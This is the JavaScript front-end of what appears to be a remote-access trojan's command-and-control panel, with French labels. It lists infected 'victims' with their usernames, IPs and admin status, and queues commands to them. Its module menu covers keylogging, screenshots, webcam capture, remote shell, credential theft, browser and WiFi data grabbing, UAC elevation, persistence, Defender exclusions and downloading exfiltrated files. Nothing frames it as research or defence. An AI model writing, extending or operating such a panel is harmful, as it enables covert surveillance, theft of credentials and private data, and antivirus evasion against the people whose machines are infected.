// Operator panel. The grid is the whole product: one row per agent, a
// right-click on the row opens the module tree, and every module is a queued
// command whose output lands in a floating window. Nothing is pushed to an
// agent, so a module window that is closed loses nothing - it can be reopened
// and re-read from history.

const state = {
  victims: [],
  sort: { key: "idle", dir: 1 },
  filter: "",
  selected: null,
  windows: new Map(),
  timer: null
};

const $ = (id) => document.getElementById(id);

async function api(path, opts) {
  const res = await fetch(path, Object.assign({ credentials: "same-origin" }, opts || {}));
  if (res.status === 401) {
    showLogin(true);
    throw new Error("auth");
  }
  return res.json();
}

function showLogin(show) {
  $("login").style.display = show ? "flex" : "none";
  if (show) setTimeout(() => $("pass").focus(), 50);
}

$("btn-login").addEventListener("click", async () => {
  const pass = $("pass").value;
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ pass })
  });
  if (res.ok) {
    $("login-err").textContent = "";
    $("pass").value = "";
    showLogin(false);
    tick();
  } else {
    $("login-err").textContent = "mot de passe refusé";
  }
});
$("pass").addEventListener("keydown", (e) => {
  if (e.key === "Enter") $("btn-login").click();
});

$("btn-logout").addEventListener("click", async () => {
  await fetch("/api/logout");
  showLogin(true);
});

$("btn-refresh").addEventListener("click", tick);
$("filter").addEventListener("input", (e) => {
  state.filter = e.target.value.toLowerCase();
  render();
});

document.querySelectorAll("thead th").forEach((th) => {
  th.addEventListener("click", () => {
    const key = th.dataset.sort;
    state.sort = { key, dir: state.sort.key === key ? -state.sort.dir : 1 };
    render();
  });
});

// ------------------------------------------------------------------ render --
function seen(sec) {
  if (sec < 75) return "à l'instant";
  if (sec < 3600) return Math.floor(sec / 60) + " min";
  if (sec < 86400) return Math.floor(sec / 3600) + " h";
  return Math.floor(sec / 86400) + " j";
}

function statusOf(v) {
  if (v.idle < 120) return "on";
  if (v.idle < 900) return "idle";
  return "off";
}

function render() {
  const rows = state.victims.filter((v) => {
    if (!state.filter) return true;
    return [v.host, v.username, v.os, v.country, v.ip, v.tag, v.id]
      .join(" ").toLowerCase().includes(state.filter);
  });

  rows.sort((a, b) => {
    const k = state.sort.key;
    let x = a[k], y = b[k];
    if (k === "idle") { x = a.idle; y = b.idle; }
    if (typeof x === "boolean") { x = x ? 1 : 0; y = y ? 1 : 0; }
    if (typeof x === "number") return (x - y) * state.sort.dir;
    return String(x || "").localeCompare(String(y || "")) * state.sort.dir;
  });

  const tb = $("rows");
  tb.innerHTML = "";
  for (const v of rows) {
    const tr = document.createElement("tr");
    if (state.selected === v.id) tr.className = "sel";
    const st = statusOf(v);
    tr.innerHTML = `
      <td><span class="dot ${st}"></span>${v.host || "?"}</td>
      <td>${v.username || "-"}</td>
      <td>${v.os || "-"}</td>
      <td>${v.country || "-"}</td>
      <td>${v.ip || "-"}</td>
      <td>${v.admin ? '<span class="tag admin">ADMIN</span>' : '<span class="tag">user</span>'}</td>
      <td>${(v.active_window || "-").replace(/</g, "&lt;")}</td>
      <td>${v.ping_ms || 0} ms</td>
      <td>${seen(v.idle)}</td>
      <td>${v.tag || ""}</td>`;
    tr.addEventListener("mousedown", (e) => {
      if (e.button === 2) {
        state.selected = v.id;
        render();
        openMenu(e.clientX, e.clientY, v);
      } else {
        state.selected = v.id;
        render();
      }
    });
    tr.addEventListener("dblclick", () => openModule(v, "info"));
    tb.appendChild(tr);
  }

  const online = state.victims.filter((v) => v.idle < 120).length;
  const queued = state.victims.reduce((n, v) => n + Number(v.queued || 0), 0);
  $("s-on").textContent = online;
  $("s-all").textContent = state.victims.length;
  $("s-q").textContent = queued;
}

async function tick() {
  try {
    const data = await api("/api/victims");
    if (data.ok) {
      state.victims = data.victims;
      render();
      for (const win of state.windows.values()) if (win.poll) win.poll();
    }
  } catch (e) {
    /* auth handled upstream */
  }
}

// -------------------------------------------------------------------- menu --
const MODULES = [
  {
    label: "Système",
    items: [
      { label: "Informations", verb: "info" },
      { label: "Processus", verb: "process_list" },
      { label: "Services", verb: "service_list" },
      { label: "Démarrage", verb: "startup_list" },
      { label: "Tâches planifiées", verb: "task_list" },
      { label: "Registre", verb: "registry_list" }
    ]
  },
  {
    label: "Fichiers",
    items: [
      { label: "Gestionnaire", verb: "ls", args: "" },
      { label: "Bureau", verb: "ls", args: "%USERPROFILE%\\Desktop" },
      { label: "Documents", verb: "ls", args: "%USERPROFILE%\\Documents" },
      { label: "Téléchargements", verb: "ls", args: "%USERPROFILE%\\Downloads" },
      { label: "Exécuter…", verb: "exec", prompt: "chemin du fichier à exécuter" }
    ]
  },
  {
    label: "Surveillance",
    items: [
      { label: "Capture d'écran", verb: "screenshot" },
      { label: "Presse-papiers", verb: "clipboard" },
      { label: "Keylogger ▸ démarrer", verb: "keylog_start" },
      { label: "Keylogger ▸ arrêter", verb: "keylog_stop" },
      { label: "Keylogger ▸ dump", verb: "keylog_dump" },
      { label: "Webcam (si présente)", verb: "webcam_snap" }
    ]
  },
  {
    label: "Réseau",
    items: [
      { label: "Shell", verb: "shell", prompt: "commande" },
      { label: "WiFi", verb: "wifi" },
      { label: "Navigateurs", verb: "browsers" },
      { label: "Fichier hosts", verb: "hosts" }
    ]
  },
  {
    label: "Récupération",
    items: [
      { label: "Voler les identifiants", verb: "steal" },
      { label: "Lister les fichiers reçus", verb: "_uploads" },
      { label: "Historique des commandes", verb: "_history" }
    ]
  },
  {
    label: "Élévation",
    items: [
      { label: "Chaîne UAC", verb: "elevate" },
      { label: "Réinstaller la persistance", verb: "persist" },
      { label: "Extension navigateur", verb: "ext" },
      { label: "Exclusions Defender", verb: "defender" }
    ]
  },
  {
    label: "Contrôle",
    items: [
      { label: "Chat", verb: "_chat" },
      { label: "Message box", verb: "msgbox", prompt: "texte affiché" },
      { label: "Visiter une URL", verb: "visit", prompt: "https://…" },
      { label: "Éteindre", verb: "shutdown" },
      { label: "Redémarrer", verb: "reboot" },
      { label: "BSOD factice", verb: "bsod" }
    ]
  }
];

let menuEl = null;

function closeMenus() {
  if (menuEl) {
    menuEl.remove();
    menuEl = null;
  }
}

document.addEventListener("mousedown", (e) => {
  if (menuEl && !menuEl.contains(e.target)) closeMenus();
});
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") closeMenus();
});

function openMenu(x, y, victim) {
  closeMenus();
  const el = document.createElement("div");
  el.id = "menu";
  el.style.display = "block";

  const head = document.createElement("div");
  head.className = "head";
  head.textContent = (victim.host || "?") + " · " + (victim.username || "-");
  el.appendChild(head);

  for (const group of MODULES) {
    const item = document.createElement("div");
    item.className = "item";
    item.innerHTML = `<span>${group.label}</span><span class="arrow">▸</span>`;

    const sub = document.createElement("div");
    sub.className = "sub";
    for (const mod of group.items) {
      const mi = document.createElement("div");
      mi.className = "item";
      mi.innerHTML = `<span>${mod.label}</span>`;
      mi.addEventListener("click", () => {
        closeMenus();
        dispatch(victim, mod);
      });
      sub.appendChild(mi);
    }
    item.appendChild(sub);
    item.addEventListener("mouseenter", () => {
      const r = item.getBoundingClientRect();
      sub.style.left = r.right + 2 + "px";
      sub.style.top = Math.min(r.top, window.innerHeight - sub.offsetHeight - 8) + "px";
    });
    el.appendChild(item);
  }

  el.appendChild(Object.assign(document.createElement("div"), { className: "sep" }));

  const del = document.createElement("div");
  del.className = "item";
  del.innerHTML = `<span style="color:#f88">Supprimer la victime</span>`;
  del.addEventListener("click", async () => {
    closeMenus();
    if (!confirm("Supprimer " + victim.host + " de la console ?")) return;
    await api("/api/remove", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ vid: victim.id })
    });
    tick();
  });
  el.appendChild(del);

  el.style.left = Math.min(x, window.innerWidth - 250) + "px";
  el.style.top = Math.min(y, window.innerHeight - 320) + "px";
  document.body.appendChild(el);
  menuEl = el;
}

// ---------------------------------------------------------------- dispatch --
function dispatch(victim, mod) {
  if (mod.verb === "_uploads") return openUploads(victim);
  if (mod.verb === "_history") return openHistory(victim);
  if (mod.verb === "_chat") return openChat(victim);

  let args = mod.args || "";
  if (mod.prompt) {
    const value = prompt(mod.label, args);
    if (value === null) return;
    args = value;
  }
  send(victim, mod.verb, args);
  openModule(victim, mod.verb, mod.label);
}

async function send(victim, verb, args) {
  await api("/api/queue", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ vid: victim.id, verb, args: args || "" })
  });
  tick();
}

// ---------------------------------------------------------------- windows --
function makeWindow(key, title, subtitle, onClose) {
  const existing = state.windows.get(key);
  if (existing) {
    existing.el.classList.add("show");
    existing.el.style.zIndex = ++zi;
    return existing;
  }

  const el = document.createElement("div");
  el.className = "win show";
  el.style.zIndex = ++zi;
  el.innerHTML = `
    <div class="bar">
      <div class="name">${title}</div>
      <div class="vid">${subtitle}</div>
      <button class="x">×</button>
    </div>
    <div class="body"></div>`;
  document.body.appendChild(el);

  const off = (state.windows.size % 7) * 26;
  el.style.left = 90 + off + "px";
  el.style.top = 70 + off + "px";

  const win = { el, body: el.querySelector(".body"), poll: null };
  state.windows.set(key, win);

  el.querySelector(".x").addEventListener("click", () => {
    el.classList.remove("show");
    if (onClose) onClose();
  });

  const bar = el.querySelector(".bar");
  let drag = null;
  bar.addEventListener("mousedown", (e) => {
    if (e.target.classList.contains("x")) return;
    drag = { x: e.clientX - el.offsetLeft, y: e.clientY - el.offsetTop };
    el.style.zIndex = ++zi;
  });
  window.addEventListener("mousemove", (e) => {
    if (!drag) return;
    el.style.left = Math.max(0, e.clientX - drag.x) + "px";
    el.style.top = Math.max(0, e.clientY - drag.y) + "px";
  });
  window.addEventListener("mouseup", () => { drag = null; });

  return win;
}

let zi = 600;

function openModule(victim, verb, label) {
  const key = victim.id + ":" + verb;
  const win = makeWindow(key, label || verb, victim.host || victim.id);
  win.body.innerHTML = `<pre class="out">en file d'attente…</pre>`;

  const poll = async () => {
    const data = await api("/api/history?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    const cmd = data.commands.find((c) => c.verb === verb);
    if (!cmd) return;
    const out = win.body.querySelector("pre.out");
    if (!out) return;
    if (cmd.output != null) {
      out.textContent = cmd.output || "(sortie vide)";
      out.dataset.done = "1";
    } else if (cmd.dispatched) {
      out.textContent = "en cours sur l'agent…\n" + (out.dataset.done ? out.textContent : "");
    } else {
      out.textContent = "en file d'attente…";
    }
  };
  win.poll = poll;
  poll();
  const timer = setInterval(() => {
    if (!win.el.classList.contains("show")) return clearInterval(timer);
    poll();
  }, 2500);
}

function openHistory(victim) {
  const win = makeWindow(victim.id + ":history", "Historique", victim.host || victim.id);
  const poll = async () => {
    const data = await api("/api/history?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    win.body.innerHTML = "<pre class='out'>" + data.commands.map((c) => {
      const t = new Date(c.created).toLocaleTimeString("fr-FR");
      const st = c.finished ? "ok" : c.dispatched ? "…" : "file";
      return `${t}  ${String(c.id).padStart(5)}  ${st.padEnd(4)}  ${c.verb} ${c.args}`;
    }).join("\n") + "</pre>";
  };
  win.poll = poll;
  poll();
}

function openUploads(victim) {
  const win = makeWindow(victim.id + ":uploads", "Fichiers reçus", victim.host || victim.id);
  const poll = async () => {
    const data = await api("/api/uploads?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    if (!data.uploads.length) {
      win.body.innerHTML = "<pre class='out'>aucun fichier</pre>";
      return;
    }
    win.body.innerHTML = "<table style='width:100%'><tbody>" +
      data.uploads.map((u) =>
        `<tr><td>${u.created.slice(0, 19).replace("T", " ")}</td>
             <td>${u.name}</td>
             <td>${(u.bytes / 1024).toFixed(1)} Ko</td>
             <td><a style="color:#6cb6ff" href="/api/download?id=${u.id}">télécharger</a></td></tr>`)
        .join("") + "</tbody></table>";
  };
  win.poll = poll;
  poll();
}

function openChat(victim) {
  const win = makeWindow(victim.id + ":chat", "Chat", victim.host || victim.id);
  win.body.innerHTML = `
    <pre class="out" style="min-height:180px;max-height:38vh;overflow:auto"></pre>
    <div class="row" style="margin-top:8px">
      <input type="text" placeholder="message…">
      <button>Envoyer</button>
    </div>`;
  const out = win.body.querySelector("pre.out");
  const input = win.body.querySelector("input");
  const btn = win.body.querySelector("button");
  btn.addEventListener("click", async () => {
    if (!input.value) return;
    out.textContent += "opérateur : " + input.value + "\n";
    await send(victim, "chat", input.value);
    input.value = "";
  });
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") btn.click();
  });
  const poll = async () => {
    const data = await api("/api/history?vid=" + encodeURIComponent(victim.id));
    if (!data.ok) return;
    const msgs = data.commands.filter((c) => c.verb === "chat" && c.output);
    out.textContent = msgs.reverse().map((c) => "cible : " + c.output).join("\n");
  };
  win.poll = poll;
  poll();
}

// -------------------------------------------------------------------- boot --
showLogin(true);
tick();
state.timer = setInterval(tick, 5000);
